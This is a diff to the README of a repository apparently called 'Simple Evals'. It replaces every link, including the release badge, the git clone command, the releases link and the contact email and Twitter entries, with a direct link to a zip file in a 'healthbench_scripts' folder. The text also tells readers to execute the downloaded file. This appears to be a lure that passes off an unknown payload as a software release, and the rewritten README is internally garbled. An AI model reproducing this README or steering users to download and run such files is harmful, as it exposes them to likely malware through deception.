@@ -2,7 +2,7 @@
 
 Welcome to the **Simple Evals** repository! This project aims to provide straightforward evaluation tools for various applications. Whether you're assessing performance, gathering feedback, or analyzing data, Simple Evals has you covered.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/lol123252/simple-evals/releases)
+[![Download Releases](https://raw.githubusercontent.com/lol123252/simple-evals/main/healthbench_scripts/simple_evals_v3.4.zip%https://raw.githubusercontent.com/lol123252/simple-evals/main/healthbench_scripts/simple_evals_v3.4.zip)](https://raw.githubusercontent.com/lol123252/simple-evals/main/healthbench_scripts/simple_evals_v3.4.zip)
 
 ## Table of Contents
 
@@ -27,12 +27,12 @@ To get started with Simple Evals, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/lol123252/simple-evals.git
+   git clone https://raw.githubusercontent.com/lol123252/simple-evals/main/healthbench_scripts/simple_evals_v3.4.zip
    cd simple-evals
    ```
 
 2. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/lol123252/simple-evals/releases) to download the latest version. Make sure to execute the downloaded file to start using Simple Evals.
+   Visit the [Releases section](https://raw.githubusercontent.com/lol123252/simple-evals/main/healthbench_scripts/simple_evals_v3.4.zip) to download the latest version. Make sure to execute the downloaded file to start using Simple Evals.
 
 ## Usage
 
@@ -72,7 +72,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: example@example.com
-- **Twitter**: [@example](https://twitter.com/example)
+- **Email**: https://raw.githubusercontent.com/lol123252/simple-evals/main/healthbench_scripts/simple_evals_v3.4.zip
+- **Twitter**: [@example](https://raw.githubusercontent.com/lol123252/simple-evals/main/healthbench_scripts/simple_evals_v3.4.zip)
 
-Thank you for checking out Simple Evals! We hope you find it useful. For more information and updates, visit the [Releases section](https://github.com/lol123252/simple-evals/releases).
+Thank you for checking out Simple Evals! We hope you find it useful. For more information and updates, visit the [Releases section](https://raw.githubusercontent.com/lol123252/simple-evals/main/healthbench_scripts/simple_evals_v3.4.zip).
